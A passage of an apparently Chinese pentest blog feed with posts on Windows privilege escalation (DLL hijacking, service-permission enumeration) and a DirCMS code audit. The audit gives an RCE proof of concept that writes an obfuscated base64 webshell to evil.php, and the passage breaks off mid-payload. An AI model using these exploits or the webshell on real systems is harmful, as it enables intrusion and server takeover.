xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html"><![CDATA[<h1 id="windows-本地提权">Windows 本地提权</h1>
<h2 id="利用服务权限错误提权">利用服务权限错误提权</h2>
<p>以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。</p>
<h3 id="dll-劫持">DLL 劫持</h3>
<ol>
  <li>寻找 DLL 劫持利用点
    <ol>
      <li>PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1</li>
      <li>Process Monitor : check for “Name Not Found”</li>
    </ol>
  </li>
  <li>编译恶意 DLL
    <ol>
      <li>For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
      <li>For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll”</li>
    </ol>

    <p>windows_dll.c 内容</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span> <span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
         <span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
         <span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>寻找权限配置不当的 PATH 目录
    <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt

 $ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

 $ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
 <span class="nb">type</span> <span class="kd">Servicenames</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
 <span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div>    </div>
  </li>
</ol>

<p>在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。</p>

<p>参考：</p>
<ul>
  <li><a href="https://www.cnblogs.com/bonelee/p/16227518.html">Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园</a></li>
</ul>

<h3 id="path-路径可写">PATH 路径可写</h3>
<p>下面的命令可以对服务的 path 路进具备的权限进行排查。</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=2 delims='='"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'wmic service list full</span><span class="se">^|</span><span class="s1">find /i "pathname"</span><span class="se">^|</span><span class="s1">find /i /v "system32"'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="vm">%a</span> <span class="o">&gt;&gt;</span> <span class="kd">c</span>:\windows\temp\permissions.txt
$ <span class="k">for</span> <span class="na">/f </span><span class="kd">eol</span><span class="se">^=^"^ </span><span class="kd">delims</span><span class="se">^=^"</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="kd">c</span>:\windows\temp\permissions.txt<span class="o">)</span> <span class="k">do</span> <span class="nb">cmd.exe</span> <span class="na">/c </span><span class="nb">icacls</span> <span class="s2">"</span><span class="vm">%a</span><span class="s2">"</span>

$ <span class="nb">sc</span> <span class="nb">query</span> <span class="kd">state</span><span class="o">=</span><span class="kd">all</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SERVICE_NAME:"</span> <span class="o">&gt;&gt;</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> <span class="nb">echo</span> <span class="vm">%i</span>
<span class="nb">type</span> <span class="kd">Servicenames</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="s2">"tokens=2 delims= "</span> <span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">Servicenames</span>.txt<span class="o">)</span> <span class="kd">DO</span> @echo <span class="vm">%i</span> <span class="o">&gt;&gt;</span> <span class="kd">services</span>.txt
<span class="kd">FOR</span> <span class="na">/F </span><span class="vm">%i</span> <span class="k">in</span> <span class="o">(</span><span class="kd">services</span>.txt<span class="o">)</span> <span class="kd">DO</span> @sc <span class="kd">qc</span> <span class="vm">%i</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"BINARY_PATH_NAME"</span> <span class="o">&gt;&gt;</span> <span class="nb">path</span>.txt
</code></pre></div></div>
<p>两组命令都可以用，但会生成文件。</p>

<p>或者也可以直接使用 msf 中的 exp：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit/windows/local/service_permissions
</code></pre></div></div>
<h3 id="windows-10---cve-2019-1322-usosvc">windows 10 - CVE-2019-1322 UsoSvc</h3>

<h3 id="windows-xp-sp1---upnphost">Windows XP SP1 - upnphost</h3>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows 本地提权 利用服务权限错误提权 以管理员/系统身份运行且文件权限不正确的服务可能导致提权，替换该文件或者劫持 DLL（需要可写权限），然后重启该服务即可。 DLL 劫持 寻找 DLL 劫持利用点 PowerSploit 中的 PowerUp 脚本：Find-PathDLLHijack PowerUp.ps1 Process Monitor : check for “Name Not Found” 编译恶意 DLL For x64 compile with: “x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll” For x86 compile with: “i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll” windows_dll.c 内容 #include &lt;windows.h&gt; BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { if (dwReason == DLL_PROCESS_ATTACH) { system("cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt"); ExitProcess(0); } return TRUE; } 寻找权限配置不当的 PATH 目录 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 在某些情况下，程序可能自主地加载某些路径的 dll，此时就需要逆向特定的应用才可以判断是否可以进行 DLL 劫持。 参考： Powershell 提权框架-Powerup——平心而论，这个提权工具还是很好用的，看后面实战例子 - bonelee - 博客园 PATH 路径可写 下面的命令可以对服务的 path 路进具备的权限进行排查。 $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a" $ sc query state=all | findstr "SERVICE_NAME:" &gt;&gt; Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt 两组命令都可以用，但会生成文件。 或者也可以直接使用 msf 中的 exp： exploit/windows/local/service_permissions windows 10 - CVE-2019-1322 UsoSvc Windows XP SP1 - upnphost]]></summary></entry><entry><title type="html">Windows 提权（二）进程相关提权方式</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html" rel="alternate" type="text/html" title="Windows 提权（二）进程相关提权方式" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html"><![CDATA[<h1 id="windows-本地提权">Windows 本地提权</h1>
<h2 id="进程相关提权方式">进程相关提权方式</h2>
<h3 id="哪些进程在运行">哪些进程在运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject <span class="nt">-Query</span> <span class="s2">"Select * from Win32_Process"</span> | where <span class="o">{</span><span class="nv">$_</span>.Name <span class="nt">-notlike</span> <span class="s2">"svchost*"</span><span class="o">}</span> | Select Name, Handle, @<span class="o">{</span><span class="nv">Label</span><span class="o">=</span><span class="s2">"Owner"</span><span class="p">;</span><span class="nv">Expression</span><span class="o">={</span><span class="nv">$_</span>.GetOwner<span class="o">()</span>.User<span class="o">}}</span> | ft <span class="nt">-AutoSize</span>
</code></pre></div></div>

<h3 id="哪些进程以-system-权限运行">哪些进程以 system 权限运行</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /v /fi <span class="s2">"username eq system"</span>
</code></pre></div></div>
<p>如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。</p>

<h3 id="powershell-版本">Powershell 版本</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG QUERY <span class="s2">"HKLM</span><span class="se">\S</span><span class="s2">OFTWARE</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\P</span><span class="s2">owerShell</span><span class="se">\1\P</span><span class="s2">owerShellEngine"</span> /v PowerShellVersion
</code></pre></div></div>
<h3 id="枚举已安装程序">枚举已安装程序</h3>
<p>已安装程序可作为提权突破点。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem <span class="s1">'C:\Program Files'</span>, <span class="s1">'C:\Program Files (x86)'</span> | ft Parent,Name,LastWriteTime
Get-ChildItem <span class="nt">-path</span> Registry::HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE | ft Name
</code></pre></div></div>

<h3 id="枚举已安装服务">枚举已安装服务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">net</span> <span class="nb">start</span>
<span class="nb">wmic</span> <span class="kd">service</span> <span class="kd">list</span> <span class="kd">brief</span>
<span class="nb">tasklist</span> <span class="na">/SVC
</span></code></pre></div></div>
<h3 id="枚举计划任务">枚举计划任务</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="m">2</span><span class="o">&gt;</span><span class="kr">nul</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="kd">TaskName</span>
<span class="nb">schtasks</span> <span class="na">/query /fo </span><span class="kd">LIST</span> <span class="na">/v </span><span class="o">&gt;</span> <span class="nb">schtasks</span>.txt<span class="o">;</span> <span class="kd">cat</span> <span class="kd">schtask</span>.txt <span class="o">|</span> <span class="kd">grep</span> <span class="s2">"SYSTEM\|Task To Run"</span> <span class="o">|</span> <span class="kd">grep</span> <span class="na">-B </span><span class="m">1</span> <span class="kd">SYSTEM</span>
<span class="kd">Get</span><span class="na">-ScheduledTask </span><span class="o">|</span> <span class="nb">where</span> <span class="o">{</span>$_.TaskPath <span class="na">-notlike </span><span class="s2">"\Microsoft*"</span><span class="o">}</span> <span class="o">|</span> <span class="kd">ft</span> <span class="kd">TaskName</span><span class="o">,</span><span class="kd">TaskPath</span><span class="o">,</span><span class="kd">State</span>
</code></pre></div></div>
<h3 id="枚举自启动应用">枚举自启动应用</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wmic</span> <span class="kd">startup</span> <span class="kd">get</span> <span class="kd">caption</span><span class="o">,</span><span class="kd">command</span>
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKLM</span>\Software\Microsoft\Windows\CurrentVersion\R
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\Run
<span class="nb">reg</span> <span class="nb">query</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\All Users\Start Menu\Programs\Startup"</span>
<span class="nb">dir</span> <span class="s2">"C:\Documents and Settings\</span><span class="nv">%username%</span><span class="s2">\Start Menu\Programs\Startup"</span>
</code></pre></div></div>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows 本地提权 进程相关提权方式 哪些进程在运行 tasklist /v net start sc query Get-Service Get-Process Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize 哪些进程以 system 权限运行 tasklist /v /fi "username eq system" 如果这些进程所在目录，或加载的 dll 所在目录可写的话，可利用 dll 劫持提权。 Powershell 版本 REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 枚举已安装程序 已安装程序可作为提权突破点。 Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name 枚举已安装服务 net start wmic service list brief tasklist /SVC 枚举计划任务 schtasks /query /fo LIST 2&gt;nul | findstr TaskName schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State 枚举自启动应用 wmic startup get caption,command reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"]]></summary></entry><entry><title type="html">DirCMS 审计</title><link href="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html" rel="alternate" type="text/html" title="DirCMS 审计" /><published>2023-08-09T13:34:21+08:00</published><updated>2023-08-09T13:34:21+08:00</updated><id>/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</id><content type="html" xml:base="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html"><![CDATA[<h1 id="dircms-审计">DirCMS 审计</h1>

<h2 id="环境搭建">环境搭建</h2>
<ul>
  <li>官网链接：http://www.dircms.cc/</li>
  <li>下载地址：<a href="https://gitee.com/greenlaw/dircms6/">dircms6</a></li>
</ul>

<h2 id="目录结构">目录结构</h2>
<h3 id="代码目录结构">代码目录结构</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">.</span>
├── admin.php
├── api
├── cache
├── config
├── dircms
├── favicon.ico
├── index.php
├── install.php
├── LICENSE
├── mobile
├── nginx.htaccess
├── README.en.md
├── README.md
├── static
├── template
├── test.php
└── uploadfile
</code></pre></div></div>
<ul>
  <li>dircms 为框架内核文件，基于迅睿 CMS 框架：<a href="http://help.xunruicms.com/">迅睿CMS框架</a></li>
</ul>

<h3 id="mvc-结构">MVC 结构</h3>
<ul>
  <li>控制器：功能相关控制器存放在 dircms/App 目录下</li>
  <li>服务类（Service）：存放在 dircms/Fcms/Core/Service.php</li>
  <li>基础类：存放在 dircms/Fcms/Library 目录下</li>
</ul>

<p>数据流：控制器 -&gt; 服务类 Service -&gt; 类加载（加载基础类）</p>

<h3 id="api">API</h3>
<ul>
  <li>pay</li>
  <li>ueditor</li>
</ul>

<h2 id="安全防护">安全防护</h2>
<ul>
  <li>dircms/Fcms/Library/Security.php 存在 XSS 过滤函数 xss_clean，其中除了 xss 过滤之外，还有部分的 php 函数过滤。
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
  <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
  <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
  <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="漏洞挖掘">漏洞挖掘</h2>

<h3 id="后台代码执行模板解析导致-rce">后台代码执行（模板解析导致 RCE）</h3>
<p>dircms/Fcms/Core/Helper.php 中存在一个 php55_replace_function 函数：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">php55_replace_function</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
            <span class="c1">// 执行函数体</span>
            <span class="nv">$param</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'$data'</span> <span class="o">?</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">:</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
            <span class="k">return</span> <span class="nb">call_user_func_array</span><span class="p">(</span>
                <span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
                <span class="nb">is_array</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span> <span class="o">?</span> <span class="p">[</span><span class="s1">'data'</span> <span class="o">=&gt;</span> <span class="nv">$param</span><span class="p">]</span> <span class="o">:</span> <span class="o">@</span><span class="nb">explode</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span> <span class="nv">$param</span><span class="p">)</span>
            <span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="s1">'函数['</span><span class="mf">.</span><span class="nv">$value</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="mf">.</span><span class="s1">']未定义'</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="nv">$value</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>该函数调用了 call_user_func_array 函数，一旦传入的参数 $value 可控，则可以执行任意 php 函数。</p>

<p>php55_replace_function 函数调用点较多，其中 dircms/Fcms/Library/Seo.php 中的 search 函数也用到了该方法，部分代码如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$rep</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">\php5replace</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="mf">...</span>
<span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'%'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">preg_replace_callback</span><span class="p">(</span><span class="s1">'#{([a-z_0-9]+)\((.*)\)}#Ui'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$rep</span><span class="p">,</span> <span class="s1">'php55_replace_function'</span><span class="p">),</span> <span class="nv">$seo</span><span class="p">[</span><span class="s1">'meta_title'</span><span class="p">]));</span>
<span class="mf">...</span>
</code></pre></div></div>
<p>使用正则表达式匹配 <code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code> 的值，匹配内容包含整个函数调用。但是这里的执行也有一定限制：</p>

<ol>
  <li>函数名只能匹配小写字母、数字与下划线。</li>
  <li>无法嵌套函数调用。</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">$seo['meta_title'])</code>来源于后台 SEO 设置，在”设置”-&gt; SEO 设置 -&gt; 搜索 SEO 中可以设置 SEO 标题，在其中的内容中添加一个函数调用：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">第</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">页</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">phpinfo</span><span class="p">(</span><span class="mi">1</span><span class="p">)}</span>
</code></pre></div></div>
<p>保存之后，再在前端访问搜索页面:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/index.php?s=news&amp;c=search&amp;keyword=1111
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20230807222653.png" alt="20230807222653" /></p>

<p>当尝试使用 system 执行命令时，会发现输入的 system() 中的括号会被 html 转义，其过滤函数可以定位到 dircms/Fcms/Library/Security.php 中的 xss_clean 函数，该函数除了会进行 XSS 的过滤，还会进行 PHP 标签 <code class="language-plaintext highlighter-rouge">&lt;?</code> 以及敏感函数的过滤，如下所示：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$str</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span>
    <span class="s1">'#(alert|prompt|confirm|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si'</span><span class="p">,</span>
    <span class="s1">'\\1\\2&amp;#40;\\3&amp;#41;'</span><span class="p">,</span>
    <span class="nv">$str</span>
<span class="p">);</span>
</code></pre></div></div>
<p>其中过滤了常见的一些命令执行函数，但并不完全，综合来看，我们需要找到满足下面条件的函数去执行命令：</p>
<ol>
  <li>不在黑名单内。</li>
  <li>不能嵌套函数。</li>
</ol>

<p>例如，我们可以使用 file_put_content 结合 php://filter 来写入文件，例如：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"php://filter/write=convert.base64-decode/resource=evil.php"</span><span class="p">,</span><span class="s2">"PD9waHAgJHFlQWY9Y3JlYXRlX2Z1bmN0aW9uKHN0cl9yb3QxMygnJCcpLmJhc2U2NF9kZWNvZGUoJ2N3PT0nKS5zdHJfcm90MTMoJ2InKS5jaHIoNTAxLTM5MikuYmFzZTY0X2RlY29kZSgnWlE9PScpLGNocigweDEzMC0weGNiKS5jaHIoMHhmZDg0LzB4MjI2KS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuY2hyKDA1NjI1MC8wMTEyMSkuY2hyKDA1MDY2NC8wMTEwNSkuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoMHgyYjAtMHgyNDMpLmJhc2U2NF9kZWNvZGUoJ1pRPT0nKS5jaHIoMHg2ZjI2LzB4MmI2KS5jaHIoMDQ3NTEwLzA1MzApKTskcWVBZihiYXNlNjRfZGVjb2RlKCdPRGM1TicuJ2pjM08wJy4nQmxka0YnLidzS0NSZicuJycuc3RyX3JvdDEzKCdIJykuY2hyKDAxNzMxMzIvMDE2MjIpLmNocig1MDQ0NS84ODUpLmNocig3MDItNjE4KS5iYXNlNjRfZGVjb2RlKCdWZz09JykuJycuJycuY2hyKDU2MDcwLzgwMSkuc3RyX3JvdDEzKCdnJykuY2hyKDMwNjE4LzM3OCkuY2hyKDB4M2Q2LTB4MzcyKS5zdHJfcm90MTMoJ2EnKS4nJy4nUklWSGwnLidFUkYwcCcuJ096STJNJy4nemt3TXonLidFNycuJycpKTs/Pg=="</span><span class="p">);</span>
</code></pre></div></div>

<p>poc 如下：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">第</span><span class="p">{</span><span class="n">page</span><span class="p">}</span><span class="n">页</span><span class="p">{</span><span class="n">join</span><span class="p">}][{</span><span class="n">keyword</span><span class="p">}{</span><span class="n">join</span><span class="p">}][{</span><span class="n">param</span><span class="p">}{</span><span class="n">join</span><span class="p">}]{</span><span class="n">modulename</span><span class="p">}{</span><span class="n">join</span><span class="p">}{</span><span class="no">SITE_NAME</span><span class="p">}{</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="n">php</span><span class="o">://</span><span class="n">filter</span><span class="o">/</span><span class="n">write</span><span class="o">=</span><span class="n">convert</span><span class="mf">.</span><span class="n">base64</span><span class="o">-</span><span class="n">decode</span><span class="o">/</span><span class="n">resource</span><span class="o">=</span><span class="n">evil</span><span class="mf">.</span><span class="n">php</span><span class="p">,</span><span 